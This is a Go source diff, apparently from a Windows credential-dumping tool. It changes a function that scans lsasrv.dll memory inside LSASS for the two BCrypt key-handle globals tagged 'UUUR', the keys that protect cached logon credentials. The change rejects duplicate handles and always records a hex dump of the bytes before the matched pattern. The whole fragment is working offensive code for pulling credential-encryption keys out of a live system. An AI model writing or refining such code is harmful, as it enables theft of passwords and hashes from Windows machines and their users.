@@ -228,6 +228,7 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 	type validatedKey struct {
 		instrOff  int
 		targetOff int
+		handlePtr uint64
 	}
 	var keyGlobals []validatedKey
 	seen := make(map[int]bool)
@@ -256,12 +257,14 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 		globalAddr := lsasrvBase + uintptr(target)
 
 		// Validate: read the pointer from the global, then check for UUUR tag
+		var handlePtrVal uint64
 		if reader != nil {
 			ptrBytes, err := reader.Read(globalAddr, 8)
 			if err != nil || len(ptrBytes) < 8 {
 				continue
 			}
-			handleAddr := uintptr(binary.LittleEndian.Uint64(ptrBytes))
+			handlePtrVal = binary.LittleEndian.Uint64(ptrBytes)
+			handleAddr := uintptr(handlePtrVal)
 			if handleAddr == 0 || handleAddr < 0x10000 {
 				continue
 			}
@@ -274,23 +277,35 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 			if tag != bcryptHandleKeyTagWant {
 				continue
 			}
+			// Ensure distinct BCrypt handles (not the same global twice)
+			isDup := false
+			for _, existing := range keyGlobals {
+				if existing.handlePtr == handlePtrVal {
+					isDup = true
+					break
+				}
+			}
+			if isDup {
+				continue
+			}
 		}
 
-		keyGlobals = append(keyGlobals, validatedKey{off, target})
+		keyGlobals = append(keyGlobals, validatedKey{off, target, handlePtrVal})
 		if len(keyGlobals) >= 2 {
 			break
 		}
 	}
 
+	// Always include hex dump for diagnostics when scanner is used
+	dumpStart := hit - 100
+	if dumpStart < 0 {
+		dumpStart = 0
+	}
+	hexDump := hex.EncodeToString(lsasrvBytes[dumpStart:hit])
+
 	if len(keyGlobals) < 2 {
-		// Dump the 100 bytes before the pattern for manual analysis
-		dumpStart := hit - 100
-		if dumpStart < 0 {
-			dumpStart = 0
-		}
-		hexDump := hex.EncodeToString(lsasrvBytes[dumpStart:hit])
-		return lsaCryptoGlobals{}, fmt.Errorf("found %d BCrypt-tag-validated key globals (need 2) scanning 300 bytes before pattern at offset %d; pre-pattern hex (100 bytes at -%d): %s",
-			len(keyGlobals), hit, hit-dumpStart, hexDump)
+		return lsaCryptoGlobals{}, fmt.Errorf("found %d distinct BCrypt key globals (need 2) scanning 300 bytes before pattern at offset %d; pre-pattern hex (100 bytes): %s",
+			len(keyGlobals), hit, hexDump)
 	}
 
 	return lsaCryptoGlobals{
